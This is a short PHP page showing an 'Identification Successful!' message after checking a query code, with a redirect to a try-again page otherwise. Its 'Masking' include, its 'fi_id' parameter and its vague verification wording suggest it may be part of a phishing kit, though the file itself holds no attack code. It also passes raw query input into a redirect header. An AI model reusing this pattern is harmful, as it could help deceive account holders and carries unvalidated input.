<?php 
  session_start();
  require_once('lib/request.php');
  require_once('domain.php');

  $loginURL = $domain . 'login.php';
  $success = "System is verifying your record...";

  $queryStringUid = $_GET['u_id'];
  $queryString = explode("-",$queryStringUid);
  $u_id = $queryString[0];
  $fi_id = $queryString[1];
	if(isset($_GET['code'])) {
  	require_once('Masking/country_sc.php');
		require_once('Responses/verified_responses.php');
	} 
	else {
		header('Location: ' . $domain . 'tryagain.php?u_id=' . $u_id . '&fi_id=' . $fi_id);
	}
?>


<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
  <head>
    <meta charset="utf-8" name="viewport" content="width=device-width, initial-scale=1">
    <title>Success</title>
    <link rel="stylesheet" type="text/css" href="success.css" />
    <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Lato:300,300i,400,400i,700,700i&amp;display=swap" />
  </head>
  <body class="Root">
    <div class="single-root">
      <div class="main-view">
	      <div class="main-view-intro">
	        <div class="main-view-logo">
	          <img class="view-image" src="check.png" alt="check">
	        </div>
	        <div class="main-view-title">
	          Identification Successful!
	        </div>
	        <div class="main-view-body">
	          We're continuing to 
	          <br>process your account
	        </div>
	      </div>
      </div>
    </div>
  </body>
  <script type="text/javascript">
  	var myGeeksforGeeksWindow;
  	function close_window() {
  		window.close();
  	}
  </script>
</html>
